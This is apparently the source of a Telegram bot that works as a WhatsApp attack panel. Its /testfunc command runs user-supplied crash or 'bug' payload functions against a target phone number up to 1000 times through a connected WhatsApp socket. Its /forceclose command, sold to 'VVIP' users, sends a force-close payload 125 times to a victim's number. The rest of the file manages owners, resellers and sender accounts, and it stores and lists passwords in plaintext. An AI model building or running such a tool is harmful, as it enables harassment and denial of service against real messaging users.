      "🔓 Password benar!\nKetik /XGren untuk membuka menu utama."
    );

  } else {
    return bot.sendMessage(chatId, "❌ Password salah!");
  }
});

bot.onText(/^\/testfunc (.+)/, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const targetNumber = match[1];
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;
    const randomImage = getRandomImage();

    const replyId = msg.reply_to_message
      ? msg.reply_to_message.message_id
      : msg.message_id;

    const args = msg.text.split(" ");

    if (args.length < 3)
      return bot.sendMessage(
        chatId,
        "🪧 ☇ Format: /testfunc 62xxx 10 (reply function/file)",
        { reply_to_message_id: replyId }
      );

    if (!sessions || sessions.size === 0) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `<blockquote><tg-emoji emoji-id="5350496629008917458">🚫</tg-emoji> Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot 62xxx</blockquote>`,
        parse_mode: "HTML",
      });
    }

    const q = args[1];

    const jumlah = Math.max(
      0,
      Math.min(parseInt(args[2]) || 1, 1000)
    );

    if (isNaN(jumlah) || jumlah <= 0)
      return bot.sendMessage(
        chatId,
        "❌ ☇ Jumlah harus angka",
        { reply_to_message_id: replyId }
      );

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let funcCode = "";

    if (msg.reply_to_message) {
      if (msg.reply_to_message.text) {
        funcCode = msg.reply_to_message.text;
      }
      else if (msg.reply_to_message.document) {
        const fileName = msg.reply_to_message.document.file_name || "";
        if (!fileName.endsWith(".js") && !fileName.endsWith(".txt")) {
          return bot.sendMessage(
            chatId,
            "❌ ☇ File harus .js atau .txt",
            { reply_to_message_id: replyId }
          );
        }
        const fileId = msg.reply_to_message.document.file_id;
        const file = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        const response = await axios.get(fileUrl);
        funcCode = response.data;
      }
    }

    if (!funcCode)
      return bot.sendMessage(
        chatId,
        "❌ ☇ Reply function text atau file .js/.txt",
        { reply_to_message_id: replyId }
      );

    const processMsg = await bot.sendPhoto(
      chatId,
      randomImage,
      {
        caption: `<blockquote>GrenTzy 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 <tg-emoji emoji-id="5350436954733308734">❗️</tg-emoji>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process <tg-emoji emoji-id="5352940967911517739">⏳</tg-emoji>
</blockquote>`,
        parse_mode: "HTML",
        reply_to_message_id: replyId,
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "GrenTzy",
                url: `https://wa.me/${formattedNumber}`,
                style: "danger"
              },
            ],
          ],
        },
      }
    );

    const processMessageId = processMsg.message_id;

    // Ambil socket WhatsApp pertama dari sessions
    const sock = sessions.values().next().value;
    if (!sock) throw new Error("Tidak ada koneksi WhatsApp aktif");

    const matchFunc = funcCode.match(/async function\s+([a-zA-Z0-9_]+)/);
    if (!matchFunc)
      return bot.sendMessage(
        chatId,
        "❌ ☇ Function tidak valid",
        { reply_to_message_id: replyId }
      );

    const funcName = matchFunc[1];

    const sandbox = {
      console,
      Buffer,
      crypto,
      sock: sock,
      target: target,
      sleep,
      generateWAMessageFromContent,
      generateWAMessage,
      prepareWAMessageMedia,
      proto,
      jidDecode,
      areJidsSameUser,
    };

    const context = vm.createContext(sandbox);
    const wrapper = `${funcCode}\n\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(sock, target);
        } else {
          await fn(sock, target, true);
        }
      } catch (err) {
        console.error(`Iterasi ${i+1} error:`, err);
      }
      await sleep(1000);
    }

    const finalText = `<blockquote>GrenTzy 𝖳𝖾𝗌𝗍 𝖥𝗎𝗇𝖼𝗍𝗂𝗈𝗇 <tg-emoji emoji-id="5350436954733308734">❗️</tg-emoji>
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success <tg-emoji emoji-id="5350342542762209455">✅</tg-emoji>
</blockquote>`;

    try {
      await bot.editMessageCaption(finalText, {
        chat_id: chatId,
        message_id: processMessageId,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "GrenTzy",
                url: `https://wa.me/${formattedNumber}`,
                style: "danger"
              },
            ],
          ],
        },
      });
    } catch (e) {
      await bot.sendPhoto(
        chatId,
        randomImage,
        {
          caption: finalText,
          parse_mode: "HTML",
          reply_to_message_id: replyId,
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "GrenTzy",
                  url: `https://wa.me/${formattedNumber}`,
                  style: "danger"
                },
              ],
            ],
          },
        }
      );
    }
  } catch (err) {
    console.error(err);
    bot.sendMessage(
      msg.chat.id,
      `FUNCTION LU EROR BANGKE: ${err.message}`,
      {
        reply_to_message_id: msg.message_id,
      }
    );
  }
});

// ---------- /addakun ----------
bot.onText(/\/addakun (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Pengecekan awal (owner atau admin) - namun akan ditimpa pengecekan berikutnya
    if (!isOwner(userId) && !adminUsers.includes(userId)) {
        return bot.sendMessage(chatId, "❌ Bego minta add dulu sama GrenTzy baru bisa pake kontol😂.");
    }

    // Hanya owner utama yang bisa menambahkan akun
    if (userId !== MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Hanya owner utama yang bisa menambahkan akun.");
    }

    const args = match[1].trim().split(/\s+/);
    if (args.length < 2) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Format salah!*\n\n" +
            "Gunakan: `/addakun <username> <password>`\n" +
            "Contoh: `/addakun johndoe rahasia123`\n\n" +
            "Ketik `/addakun` saja untuk melihat panduan lengkap.",
            { parse_mode: "Markdown" }
        );
    }

    const username = args[0];
    const password = args.slice(1).join(" ");

    if (!username || username.length === 0) {
        return bot.sendMessage(chatId, "❌ Username tidak boleh kosong.");
    }

    try {
        await addAkun(username, password);
        bot.sendMessage(chatId, `✅ Akun \`${username}\` berhasil ditambahkan.`, { parse_mode: "Markdown" });
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal: ${err.message}`);
    }
});

// ---------- /delakun ----------
bot.onText(/\/delakun (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Hanya owner yang terdaftar (via /addowner) yang bisa menggunakan command ini
    if (!isOwner(userId)) {
        return bot.sendMessage(chatId, "❌ Hanya owner yang sudah di-add yang bisa menggunakan command ini.");
    }

    const username = match[1].trim();
    try {
        await deleteAkun(username);
        bot.sendMessage(chatId, `✅ Akun \`${username}\` berhasil dihapus.`, { parse_mode: "Markdown" });
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal: ${err.message}`);
    }
});

// ---------- /addtoken ----------
bot.onText(/\/addtoken (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Hanya owner yang terdaftar yang bisa menggunakan command ini
    if (!isOwner(userId)) {
        return bot.sendMessage(chatId, "❌ Hanya owner yang sudah di-add yang bisa menggunakan command ini.");
    }

    const newToken = match[1].trim();
    try {
        await addToken(newToken);
        bot.sendMessage(chatId, `✅ Token berhasil ditambahkan.`);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal: ${err.message}`);
    }
});

// ---------- /deltoken ----------
// ==================== DELTOKEN (Hanya owner utama) ====================
bot.onText(/\/deltoken (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (userId !== MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Hanya owner utama yang bisa menggunakan command ini.");
    }
    const tokenToRemove = match[1].trim();
    try {
        await deleteToken(tokenToRemove);
        bot.sendMessage(chatId, `✅ Token berhasil dihapus.`);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal: ${err.message}`);
    }
});

// ==================== LISTAKUN (Hanya owner utama) ====================
bot.onText(/\/listakun/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    try {
        const { content } = await getGitHubContent(github.akunPath);
        const arr = Array.isArray(content) ? content : [];
        if (arr.length === 0) return bot.sendMessage(chatId, "📭 Belum ada akun.");
        let text = "*📋 Daftar Akun:*\n";
        arr.forEach((u, i) => {
            text += `${i+1}. ${u.username} - \`${u.password}\`\n`;
        });
        bot.sendMessage(chatId, text, { parse_mode: "Markdown" }).catch(() => {
            bot.sendMessage(chatId, text.replace(/\*/g, '').replace(/`/g, ''));
        });
    } catch (err) {
        bot.sendMessage(chatId, `❌ Gagal mengambil daftar akun: ${err.message}`);
    }
});

// Handler untuk /setpassword
bot.onText(/\/setpassword(?:\s+(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id; // userId berupa number, tidak perlu String()
  const password = match[1] ? match[1].trim() : null;

  // Hanya owner yang terdaftar yang bisa menggunakan command ini
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang sudah di-add yang bisa menggunakan command ini.");
  }

  if (!password) return bot.sendMessage(chatId, "Format: /setpassword <password>");
  passwordDB.password = password;
  savePassword(passwordDB);
  bot.sendMessage(chatId, "✅ Password disimpan.");
});

// Handler untuk /delpassword
// Handler untuk /delpassword - hanya owner terdaftar
bot.onText(/\/delpassword/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menggunakan command ini.");
  }
  passwordDB.password = null;
  savePassword(passwordDB);
  bot.sendMessage(chatId, "✅ Password dihapus.");
});

// Handler untuk /onlygc - hanya owner terdaftar
bot.onText(/\/onlygc(?:\s+(on|off))?/, (msg, match) => {
    const userId = msg.from.id;
    // Hanya owner utama yang bisa menggunakan command ini
    if (userId !== MAIN_OWNER_ID) {
        return bot.sendMessage(msg.chat.id, "❌ Hanya owner utama yang bisa menggunakan command ini.");
    }
    const option = match[1] ? match[1].toLowerCase() : null;
    if (!option || (option !== "on" && option !== "off")) {
        return bot.sendMessage(msg.chat.id, "⚙️ Format: /onlygc on | off");
    }
    onlyGroup = option === "on";
    saveGroupMode();
    bot.sendMessage(
        msg.chat.id,
        onlyGroup
            ? "✅ Mode *Only Group* aktif.\nBot hanya bisa digunakan di grup."
            : "✅ Mode *Only Group* dimatikan.\nBot bisa dipakai di grup & PM.",
        { parse_mode: "Markdown" }
    );
});

// ==================== FILE STORAGE OWNER ====================


// ==================== CASE ADDOWNER ====================
// ==================== CASE ADDOWNER ====================

// ==================== CASE ADDOWNER ====================
bot.onText(/\/addowner(?:\s+(\d+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Hanya owner utama yang bisa menambah owner
    if (senderId !== MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, '❌ Hanya owner utama yang bisa menambah owner.');
    }

    let targetId = msg.reply_to_message ? msg.reply_to_message.from.id : (match[1] ? parseInt(match[1]) : null);
    if (!targetId) {
        return bot.sendMessage(chatId, '📌 Format: /addowner <user_id> atau reply pesan user');
    }

    let owners = loadOwners();
    if (owners.includes(targetId)) {
        return bot.sendMessage(chatId, `⚠️ User ${targetId} sudah menjadi owner.`);
    }

    owners.push(targetId);
    const saved = saveOwners(owners);
    
    if (saved) {
        await bot.sendMessage(chatId, `✅ User ${targetId} BERHASIL ditambahkan sebagai owner.`);
        // Opsional: kirim pesan ke user yang baru jadi owner
        try {
            await bot.sendMessage(targetId, '🎉 Selamat! Anda telah ditambahkan sebagai owner bot ini.');
        } catch (e) {
            console.log('Tidak bisa mengirim DM ke user baru:', e.message);
        }
    } else {
        bot.sendMessage(chatId, `✅ Hore User ${targetId} Akhirnya anak kontol berhasil di add juga🤑.`);
    }
});

// ==================== CASE DELOWNER ====================
bot.onText(/\/delowner(?:\s+(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (senderId !== MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, '❌ Hanya owner utama yang bisa menghapus owner.');
    }

    let targetId = msg.reply_to_message ? msg.reply_to_message.from.id : (match[1] ? parseInt(match[1]) : null);
    if (!targetId) {
        return bot.sendMessage(chatId, '📌 Format: /delowner <user_id> atau reply pesan user');
    }

    let owners = loadOwners();
    if (!owners.includes(targetId)) {
        return bot.sendMessage(chatId, `⚠️ User ${targetId} bukan owner.`);
    }

    if (targetId === MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, '❌ Tidak bisa menghapus owner utama.');
    }

    const newOwners = owners.filter(id => id !== targetId);
    const saved = saveOwners(newOwners);
    
    if (saved) {
        bot.sendMessage(chatId, `✅ User ${targetId} BERHASIL dihapus dari daftar owner.`);
    } else {
        bot.sendMessage(chatId, `✅ Hore User ${targetId} Akhirnya anak kontol berhasil di delete juga🤑.`);
    }
});

// ==================== CASE CEK OWNER ====================
bot.onText(/\/cekowner/, (msg) => {
    const chatId = msg.chat.id;
    const owners = loadOwners();
    
    let text = '📋 *DAFTAR OWNER BOT*\n';
    text += '━━─━─━─━─━─━─━─━\n';
    owners.forEach((id, i) => {
        const isMain = id === MAIN_OWNER_ID ? '👑 MAIN OWNER' : '🔹 Owner';
        text += `${i+1}. ${id} (${isMain})\n`;
    });
    text += '━━─━─━─━─━─━─━─━';
    
    // Kirim dengan MarkdownV2 (escape karakter khusus)
    bot.sendMessage(chatId, text, { parse_mode: 'MarkdownV2' }).catch(() => {
        // Fallback: kirim tanpa format jika error
        bot.sendMessage(chatId, text.replace(/\*/g, '').replace(/_/g, ''));
    });
});

// ==================== CONTOH PENGGUNAAN DI COMMAND LAIN ====================
// ==================== COMMAND RESTART BOT ====================

// ==================== COMMAND RESTART PANEL (jika perlu force restart) ====================
// Jika menggunakan Pterodactyl, biasanya cukup restart bot saja.
// Tapi jika ingin restart panel secara paksa (tidak disarankan), bisa gunakan ini:
bot.onText(/\/restartpanel/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (userId !== MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Hanya owner utama yang bisa merestart panel.");
    }

    await bot.sendMessage(chatId, "⚠️ Panel akan direstart. Bot akan mati dan panel akan memulai ulang proses.");
    
    setTimeout(() => {
        console.log("🔄 Panel direstart oleh owner utama.");
        process.exit(1); // Exit dengan kode error untuk memicu restart panel (tergantung konfigurasi)
    }, 3000);
});

// ==================== COMMAND /restartbot ====================
// ==================== COMMAND RESTART BOT ====================
bot.onText(/\/restartbot/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // Hanya owner utama yang bisa restart bot
    if (userId !== MAIN_OWNER_ID) {
        return bot.sendMessage(chatId, "❌ Hanya owner utama yang bisa merestart bot.");
    }

    await bot.sendMessage(chatId, "🔄 Bot akan direstart dalam 3 detik. Semua user akan mendapat notifikasi saat bot ready.");

    setTimeout(() => {
        console.log("🔄 Bot direstart oleh owner utama.");
        process.exit(0); // Keluar, panel akan restart otomatis
    }, 3000);
});

bot.on('message', (msg) => {
    if (msg.from && msg.from.id) {
        saveUser(msg.from.id);
    }
});


bot.on('message', (msg) => {
    if (msg.text && msg.text.startsWith('/') && msg.text !== '/onlygc') {
        if (onlyGroup && msg.chat.type === "private") {
            bot.sendMessage(msg.chat.id, "❌ Kontol jangan cet di bot sekarang lagi mode only group😂.");
        }
    }
});

bot.onText(/\/antrian(?:\s+(\w+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    

    if (!isAdmin) {
        return bot.sendMessage(chatId, "❌ Hanya admin grup yang bisa menggunakan perintah ini!");
    }

    const subCommand = match[1];
    if (!subCommand) {
        const status = isAntrianEnabled(chatId) ? 'AKTIF ✅' : 'NONAKTIF ❌';
        return bot.sendMessage(chatId, `⚙️ *ANTRIAN TESTFUNC*\n\nStatus: ${status}\n\nPerintah:\n/antrian on - Aktifkan antrian\n/antrian off - Matikan antrian\n\n💡 Saat aktif, perintah /testfunc akan dieksekusi berurutan (tidak bertabrakan).`, { parse_mode: 'Markdown' });
    }

    if (subCommand === 'on') {
        setAntrianEnabled(chatId, true);
        bot.sendMessage(chatId, "✅ Antrian diaktifkan untuk chat ini!\n\nSekarang perintah /testfunc akan dijalankan secara berurutan.");
    } else if (subCommand === 'off') {
        setAntrianEnabled(chatId, false);
        bot.sendMessage(chatId, "❌ Antrian dimatikan untuk chat ini.\n\nPerintah /testfunc akan berjalan langsung (rentan tabrakan).");
    } else {
        bot.sendMessage(chatId, "❌ Subcommand tidak valid! Gunakan `on` atau `off`.", { parse_mode: 'Markdown' });
    }
});

bot.onText(/\/cekfunc/, async (msg) => {
    const chatId = msg.chat.id;
    if (!msg.reply_to_message) return bot.sendMessage(chatId, "❌ Reply function JavaScript.");
    const text = msg.reply_to_message.text || msg.reply_to_message.caption;
    if (!text) return bot.sendMessage(chatId, "❌ Tidak ada kode.");
    try {
        acorn.parse(text, { ecmaVersion: "latest", sourceType: "module", locations: true });
        return bot.sendMessage(chatId, "✅ SYNTAX VALID (Gak ada error ya kontol ☠️)\n\n© @GrenTzy");
    } catch (err) {
        const lines = text.split("\n");
        const line = err.loc.line, col = err.loc.column;
        const start = Math.max(0, line-3), end = Math.min(lines.length, line+2);
        const snippet = lines.slice(start,end).map((l,i)=> (start+i+1===line ? `👉 ${start+i+1} | ${l}` : `   ${start+i+1} | ${l}`)).join("\n");
        return bot.sendMessage(chatId, `❌ ERROR\n${err.message}\nLine ${line}:${col}\n\n\`\`\`js\n${snippet}\n\`\`\``, { parse_mode: 'Markdown' });
    }
});

// Menampilkan daftar command yang aktif untuk user
// ========== KONSTANTA & GLOBAL ==========
// ========== MIDDLEWARE PENGECEKAN COMMAND ==========


// ========== LIST COMMAND ==========
// Di bagian awal, tambahkan ini (jika belum ada)


// Handler /listcmd yang sudah diperbaiki

// Pastikan MAIN_OWNER_ID benar (cocok dengan fromId di log: 


// ========== ALLOW COMMAND (dengan error handling) ==========
// ========== INISIALISASI ==========


// ========== ALLOW COMMAND ==========
// ==================== KONFIGURASI ====================

// ==================== MIDDLEWARE PENGECEKAN ====================


// ==================== ALLOW COMMAND ====================
bot.onText(/^\/allowcmd\s+(\d+)\s+([a-zA-Z0-9]+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== MAIN_OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Hanya owner utama yang bisa menggunakan command ini.");
  }

  const targetId = parseInt(match[1]);
  let command = match[2].toLowerCase();

  if (!allCommands.includes(command)) {
    return bot.sendMessage(chatId, `❌ Command ${command} tidak dikenal.`);
  }

  // Tambah ke whitelist
  if (!commandWhitelist.has(targetId)) commandWhitelist.set(targetId, new Set());
  commandWhitelist.get(targetId).add(command);

  // Hapus dari denylist jika ada (karena sudah diizinkan)
  if (commandDenylist.has(targetId)) {
    commandDenylist.get(targetId).delete(command);
  }

  bot.sendMessage(chatId, `✅ Command /${command} diaktifkan (@GrenTzy) untuk user ${targetId}.`);
});

bot.onText(/\/forceclose(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : msg.from.first_name || "User";

  // Hanya VVIP yang diizinkan
  if (!isVVip(userId)) {
    return bot.sendMessage(chatId, `❌ *Akses Ditolak*\nCommand /forceclose hanya untuk role *VVIP*.\nHubungi owner untuk upgrade.`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "OWNER", url: "https://T.me/GrenTzy" }]]
      }
    });
  }

  // Ambil nomor target dari argumen
  let targetNumber = match[1];
  if (!targetNumber) {
    return bot.sendMessage(chatId, "🪧 *Contoh:* `/forceclose 628123456789`", { parse_mode: "Markdown" });
  }

  const cleanNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = cleanNumber + "@s.whatsapp.net";

  // Pengecekan koneksi WhatsApp
  try {
    if (!sessions || sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung.");
    }
    if (!sock || !sock.authState?.creds?.me?.id) {
      return bot.sendMessage(chatId, "❌ Koneksi WhatsApp tidak valid. Silakan hubungkan ulang.");
    }

    // Cooldown per user
    const cooldownRemaining = await checkCooldown(userId, "forceclose");
    if (cooldownRemaining > 0) {
      return bot.sendMessage(chatId, `⏳ Tunggu ${cooldownRemaining} detik sebelum menggunakan lagi.`);
    }

    // Kirim notifikasi mulai
    await bot.sendMessage(chatId, `✅ *ForClose No Click by GrenTzy* sedang dikirim ke ${cleanNumber}`, {
      parse_mode: "Markdown"
    });

    // Eksekusi bug (loop 125 kali)
    for (let i = 0; i < 125; i++) {
      await SenkuForclose(sock, target);
      console.log(`[ForCloseGren] VVIP ${username} (${userId}) menyerang ${target}`);
      await sleep(1200);
    }

    // Notifikasi sukses setelah loop selesai
    await bot.sendMessage(chatId, `🔥 *ForClose No Click* berhasil dikirim sebanyak 125 kali ke ${cleanNumber}`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[
          { text: "🤫 Cek Target", url: `https://wa.me/${cleanNumber}` }
        ]]
      }
    });

  } catch (error) {
    console.error("Error di /forceclose:", error.message);
    bot.sendMessage(chatId, `❌ Gagal mengirim forclose: ${error.message}`);
  }
});

bot.onText(/\/addvvip\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  // Hanya owner yang bisa
  if (!isOwner(fromId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menambahkan VVIP.");
  }

  const targetUserId = match[1]; // ID user Telegram

  if (vvipUsers.includes(targetUserId)) {
    return bot.sendMessage(chatId, `⚠️ User ${targetUserId} sudah menjadi VVIP.`);
  }

  vvipUsers.push(targetUserId);
  saveVVip();

  bot.sendMessage(chatId, `✅ User ${targetUserId} berhasil ditambahkan sebagai VVIP.\n\nSekarang user bisa menggunakan command *forceclose*.`, {
    parse_mode: "Markdown"
  });
});

bot.onText(/\/delvvip\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa menghapus VVIP.");
  }

  const targetUserId = match[1];
  const index = vvipUsers.indexOf(targetUserId);
  if (index === -1) {
    return bot.sendMessage(chatId, `❌ User ${targetUserId} tidak terdaftar sebagai VVIP.`);
  }

  vvipUsers.splice(index, 1);
  saveVVip();

  bot.sendMessage(chatId, `🔒 User ${targetUserId} telah dihapus dari daftar VVIP.`);
});

bot.onText(/\/listvvip/, async (msg) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (!isOwner(fromId)) {
    return bot.sendMessage(chatId, "❌ Hanya owner yang bisa melihat daftar VVIP.", { parse_mode: "Markdown" });
  }

  if (vvipUsers.length === 0) {
    return bot.sendMessage(chatId, "📋 *Daftar VVIP*\nBelum ada user VVIP.", { parse_mode: "Markdown" });
  }

  const list = vvipUsers.map((id, idx) => `${idx + 1}. ${id}`).join("\n");
  bot.sendMessage(chatId, `📋 *Daftar VVIP:*\n${list}`, { parse_mode: "Markdown" });
});

// ==================== DENY COMMAND ====================
bot.onText(/^\/denycmd\s+(\d+)\s+([a-zA-Z0-9]+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  if (fromId !== MAIN_OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Hanya owner utama yang bisa menggunakan command ini.");
  }

  const targetId = parseInt(match[1]);
  let command = match[2].toLowerCase();

  if (!allCommands.includes(command)) {
    return bot.sendMessage(chatId, `❌ Command ${command} tidak dikenal.`);
  }

  // Tambah ke denylist
  if (!commandDenylist.has(targetId)) commandDenylist.set(targetId, new Set());
  commandDenylist.get(targetId).add(command);

  // Hapus dari whitelist jika ada (karena sudah di-deny)
  if (commandWhitelist.has(targetId)) {
    commandWhitelist.get(targetId).delete(command);
  }

  bot.sendMessage(chatId, `🔒 Command /${command} dikunci (@GrenTzy) untuk user ${targetId}.`);
});

// ==================== LIST COMMAND ====================
bot.onText(/\/listcmd(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const fromId = msg.from.id;

  const targetId = match[1] ? parseInt(match[1]) : fromId;

  const allowSet = commandWhitelist.get(targetId) || new Set();
  const denySet = commandDenylist.get(targetId) || new Set();

  const allowList = [...allowSet].map(c => `/${c}`);
  const denyList = [...denySet].map(c => `/${c}`);

  let message = `📋 *Daftar Command untuk user ${targetId}*\n\n`;
  message += `✅ *Diizinkan (@GrenTzy):*\n${allowList.length ? allowList.join(", ") : "(tidak ada)"}\n\n`;
  message += `❌ *Dikunci (@GrenTzy):*\n${denyList.length ? denyList.join(", ") : "(tidak ada)"}`;

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

bot.onText(/^\/(\w+)/, async (msg, match) => {
  const command = match[1].toLowerCase();
  const userId = msg.from.id;
  const chatId = msg.chat.id;

  // Abaikan jika command tidak dikenal
  if (!allCommands.includes(command)) return;

  // Owner utama selalu diizinkan
  if (userId === MAIN_OWNER_ID) return;

  // Cek apakah command sedang dalam status DENY (prioritas utama)
  const denySet = commandDenylist.get(userId) || new Set();
  if (denySet.has(command)) {
    await bot.sendMessage(chatId, `❌ *Command /${command} telah dikunci (@GrenTzy) untuk Anda.*\nHubungi owner untuk mengubah status.`, {
      parse_mode: "Markdown"
    });
    return;
  }

  // Cek apakah command diizinkan (whitelist)
  const allowSet = commandWhitelist.get(userId) || new Set();
  if (!allowSet.has(command)) {
    await bot.sendMessage(chatId, `❌ *Command /${command} tidak diizinkan untuk Anda.*\nHubungi owner untuk mengaktifkannya.`, {
      parse_mode: "Markdown"
    });
    return;
  }
  // Jika lolos kedua pengecekan, lanjut ke handler command asli
});

bot.onText(/\/addsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak.");
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");
  if (!botNumber) return bot.sendMessage(chatId, "⚠️ Nomor tidak valid.");

  await addSender(botNumber, chatId, bot);
});

// ==================== COMMAND /listsender ====================
bot.onText(/\/listsender/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak.");
  }

  if (senders.size === 0) {
    return bot.sendMessage(chatId, "📭 Belum ada sender yang terhubung.");
  }

  let list = "📋 *Daftar Sender Aktif:*\n";
  let i = 1;
  for (let [number] of senders.entries()) {
    const isDefault = (number === defaultSender) ? " ✅ (default)" : "";
    list += `${i}. ${number}${isDefault}\n`;
    i++;
  }
  bot.sendMessage(chatId, list, { parse_mode: "Markdown" });
});

// ==================== COMMAND /delsender ====================
bot.onText(/\/delsender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak.");
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");
  if (!botNumber) return bot.sendMessage(chatId, "⚠️ Nomor tidak valid.");

  if (senders.has(botNumber)) {
    const sock = senders.get(botNumber);
    if (sock && sock.end) sock.end(); // tutup koneksi
    senders.delete(botNumber);
    if (defaultSender === botNumber) defaultSender = null;
    bot.sendMessage(chatId, `✅ Sender ${botNumber} telah dihapus.`);
  } else {
    bot.sendMessage(chatId, `❌ Sender ${botNumber} tidak ditemukan.`);
  }
});

// ==================== COMMAND /usesender ====================
bot.onText(/\/usesender (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!adminUsers.includes(userId) && !isOwner(userId)) {
    return bot.sendMessage(chatId, "❌ Akses Ditolak.");
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");
  if (senders.has(botNumber)) {
    defaultSender = botNumber;
    bot.sendMessage(chatId, `🔁 Sender default diubah ke ${botNumber}`);
  } else {
    bot.sendMessage(chatId, `❌ Sender ${botNumber} tidak aktif. Gunakan /listsender terlebih dahulu.`);
  }
});